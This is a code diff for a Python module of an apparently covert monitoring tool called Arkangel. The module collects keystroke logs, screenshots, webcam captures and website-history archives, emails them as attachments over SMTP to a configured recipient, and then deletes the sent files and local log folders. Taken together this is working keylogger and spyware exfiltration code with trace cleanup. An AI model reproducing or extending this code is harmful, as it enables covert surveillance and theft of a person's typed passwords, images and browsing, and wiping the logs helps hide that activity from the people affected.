@@ -4,31 +4,31 @@ from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
 import os
 from getsqldata import *
-'''
-#compress file
-import zipfile
-import os
-import pyminizip
+from datetime import datetime
 
-def make_zipfile(output_filename, source_dir):
-    relroot = os.path.abspath(os.path.join(source_dir, os.pardir))
-    with zipfile.ZipFile(output_filename, "w", zipfile.ZIP_DEFLATED) as zip:
-        for root, dirs, files in os.walk(source_dir):
-            # add directory (needed for empty dirs)
-            zip.write(root, os.path.relpath(root, relroot))
-            for file in files:
-                filename = os.path.join(root, file)
-                if os.path.isfile(filename): # regular files only
-                    arcname = os.path.join(os.path.relpath(root, relroot), file)
-                    zip.write(filename, arcname)
-    
-
-#make_zipfile('myzip.zip','Screenshot')
-#pyminizip.compress("myzip.zip","./","myzip.zip","abcdef",5)
-'''
 uid = getCurrentUser()
 conf = getRowValue('Email',uid)
 deli = getRowValue('EmailDelivery',uid)
+
+def DelSentLogs(files):
+    for f in files:
+        if(os.path.exists(f)):
+            os.remove(f)
+            
+def DelCurrLogs(pathDir):
+    if(os.path.exists(pathDir)):
+        for i in os.listdir(pathDir):
+            os.remove(os.path.join(pathDir, i))
+    
+def TotalFileSize(arr_file):
+    size = 0
+    for f in arr_file:
+        if(os.path.exists(f)):
+            size = size + os.path.getsize(f)
+    return size >> 10
+
+size = conf[9]
+enSize = conf[8]
 
 fromaddr = deli[4] # uname
 toaddr = deli[1] # sendto
@@ -43,26 +43,41 @@ msg['From'] = fromaddr
 msg['To'] = toaddr
  
 # storing the subject 
-msg['Subject'] = "Test send mail"
+msg['Subject'] = deli[6]
  
 # string to store the body of the mail
-body = "Body_of_the_mail"
+body = "Message from Arkangel!!"
  
 # attach the body with the msg instance
 msg.attach(MIMEText(body, 'plain'))
 
-dir_path = "./" # thu muc chua file can gui
+keystrokeLogs = datetime.now().strftime('%Y_%m_%d')+'.txt'
+dir_path = getRowValue('Setting',uid) # thu muc chua file can gui
+
 # cac file can gui
-files = ["Webcam.zip","Screenshot.zip","key_log.txt","Website.zip"]
-#files = ['key_log.txt','acb.txt']
+files = []
+if (conf[4] == 1):
+    files.append(os.path.join(dir_path[1],keystrokeLogs))
+if (conf[5] == 1):
+    files.append(os.path.join(dir_path[3],"Screenshot.zip"))
+if (conf[6] == 1):
+    files.append(os.path.join(dir_path[2],"Webcam.zip"))
+if (conf[7] == 1):
+    files.append(os.path.join(dir_path[5],"Website.zip"))
+'''
+files = [os.path.join(dir_path[2],"Webcam.zip"),
+         os.path.join(dir_path[3],"Screenshot.zip"),
+         os.path.join(dir_path[1],keystrokeLogs),
+         os.path.join(dir_path[5],"Website.zip")]
+'''
 for f in files:  # add files to the message
-    file_path = os.path.join(dir_path, f)
-    if (os.path.exists(file_path)):
-        attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt")
+    if (os.path.exists(f)):
+        attachment = MIMEApplication(open(f, "rb").read(), _subtype="txt")
         attachment.add_header('Content-Disposition','attachment', filename=f)
         msg.attach(attachment)
+        print("Attach " +str(f)+" sucessful!")
     else:
-        print(str(file_path) + " does not exists!!!")
+        print(str(f) + " does not exists!!!")
 # creates SMTP session
 smtp = deli[2]
 port = deli[3]
@@ -77,9 +92,37 @@ s.login(fromaddr, pwd)
  
 # Converts the Multipart msg into a string
 text = msg.as_string()
- 
-# sending the mail
-s.sendmail(fromaddr, toaddr, text)
+try:
+    success = 0
+    if(enSize == 1 and TotalFileSize(files) > size):
+        # sending the mail
+        s.sendmail(fromaddr, toaddr, text)
+        print("Send mail successful!")
+        success = 1
+    elif(enSize == 0 and conf[1] == 1):
+        s.sendmail(fromaddr, toaddr, text)
+        success = 1
+        print("Send mail successful!")
+    
+    if (success == 1):
+        wc = getRowValue("Webcam",uid)
+        if(conf[10] == 1):
+            # delete sent log
+            DelSentLogs(files)
+            print("Del sent logs ok")
+            # delete exists log in folder
+            DelCurrLogs(os.path.join(dir_path[2],"Webcam"))   
+            DelCurrLogs(os.path.join(dir_path[3],"Screenshot"))
+            DelCurrLogs(os.path.join(dir_path[5],"Website"))
+            print("Del log in folder ok")
+        elif(wc[7] == 1):
+            # if email not set delete after upload successful,
+            # check in webcam to delete
+            DelCurrLogs(os.path.join(dir_path[2],"Webcam"))
+            print("Del webcam logs ok")
+
+except Exception as e:
+    print("Error : " + str(e))
  
 # terminating the session
 s.quit()
